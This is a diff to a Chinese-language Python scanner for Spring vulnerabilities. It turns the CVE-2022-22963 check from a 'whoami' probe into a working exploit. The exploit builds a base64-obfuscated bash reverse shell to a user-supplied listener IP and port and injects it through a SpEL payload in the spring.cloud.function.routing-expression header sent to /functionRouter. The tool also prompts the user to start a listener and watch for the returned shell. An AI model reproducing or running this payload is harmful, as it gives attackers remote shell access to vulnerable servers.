@@ -8,8 +8,13 @@ import queue
 import sys
 import urllib3
 import threading
+import base64
 init(autoreset=True)
-url=input("输入想要日的域名:")
+readme=input("针对cve-2022-22963漏洞最好有一台在公网上，能监听的主机，没钱的家庭可以到路由器映射自己的端口出去（按任意键继续）")
+lhost=input("输入监听主机IP：")
+lport=input("输入监听端口：")
+print(colorama.Fore.RED+"记得开监听")
+url=input("输入想要测试的域名或IP：")
 print("")
 ##暂时只有Sping系列的信息泄露、cve-2022-22947、cve-2022-22963、cve-2022-22965
 ##by Skr11lex & 一江明月
@@ -44,7 +49,13 @@ print("################################")
 print("################################")
 
 
-payload = f'T(java.lang.Runtime).getRuntime().exec("{"whoami"}")'
+command='bash -i >&/dev/tcp/'+lhost+'/'+lport+' 0>&1'
+command1=command.encode('utf-8')
+command2=str(base64.b64encode(command1))
+command3 = command2.strip('b')
+command4 = command3.strip("'")
+command5 = 'bash -c {echo,' + command4 + '}|{base64,-d}|{bash,-i}'
+payload = f'T(java.lang.Runtime).getRuntime().exec("{command5}")'
 headers2 = {
     'spring.cloud.function.routing-expression': payload,
     'Accept-Encoding': 'gzip, deflate',
@@ -57,9 +68,10 @@ path = '/functionRouter'
 data = 'test'
 r1 = requests.post(url=url+path, headers=headers2, data=data,)
 if r1.status_code == 500:
-    print(colorama.Fore.CYAN+"[+]" + url + "可能存在CVE-2022-22963漏洞(有几率误报，须手动测试)")
+    print(colorama.Fore.CYAN+"[+]" + url + "可能存在CVE-2022-22963漏洞，看看监听有没有返回shell")
 else:
     print("[-]"+url+"目标不存在CVE-2022-22963漏洞")
+
 
 
 
@@ -132,4 +144,4 @@ if __name__ == "__main__":
 
 print("扫描完毕")
 
-end=input('按任意键退出')
+end=input('寄，什么都扫不出')##防止打包exe之后运行闪退
